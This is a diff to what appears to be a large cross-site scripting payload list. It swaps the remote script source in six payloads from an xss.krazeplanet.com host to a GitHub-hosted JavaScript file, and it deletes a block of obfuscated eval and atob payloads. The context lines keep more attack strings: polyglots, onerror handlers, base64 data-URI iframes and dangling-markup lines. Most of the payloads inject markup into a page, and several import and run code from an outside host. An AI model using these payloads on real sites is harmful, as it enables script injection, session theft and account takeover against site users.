@@ -20524,12 +20524,12 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</
 1')"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//
 1'"--><Img/Src/OnError=(confirm)(1)//<!--
 1</Script/><Img/Src/OnError%3Dconfirm?.(1)>
-')"--><img src="x" onerror="import('//xss.krazeplanet.com/10.js')">
-')"--><img src="x" onload="import('//xss.krazeplanet.com/10.js')">
-')"--><svg/onload=import('//xss.krazeplanet.com/10.js')>
-')"--><img/onerror=import('//xss.krazeplanet.com/10.js')>
-')"--><img/onload=import('//xss.krazeplanet.com/10.js')>
-')"--><img src=//xss.krazeplanet.com/10.js OnLoad=import(src)>
+')"--><img src="x" onerror="import('//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js')">
+')"--><img src="x" onload="import('//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js')">
+')"--><svg/onload=import('//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js')>
+')"--><img/onerror=import('//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js')>
+')"--><img/onload=import('//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js')>
+')"--><img src=//https://github.com/NARKHEDE-VAIBHAV/data/blob/main/xss/xss3.js OnLoad=import(src)>
 ')"--><Img Src=//xss.krazeplanet.com/1.js OnLoad%0C=import(Src)//
 ')"--><img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
 ')"--><img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
@@ -30480,16 +30480,4 @@ data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%
 `"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>` : Iframe with base64 encoded script.
 <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
 <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
-<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
-<script>var fn=window[490837..toString(1<<5)];fn(atob('YWxlcnQoMSk='));</script>
-<script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));</script>
-<script>var fn=window[String.fromCharCode(101,118,97,108)];fn(atob('YWxlcnQoMSk='));</script>
-<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
-<script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
-<script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>
-<script>eval('\141lert(1)')</script>
-<svg><script>&#97;lert(1)</script></svg>
-<svg><script>&#x61;lert(1)</script></svg>
-<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
-<script>eval(atob('YWxlcnQoJ0hPTUUgY2hhbGxlbmdlJyk='))</script>
-')"--><Script/Src=//xss.krazeplanet.com/10.js></Script>
+
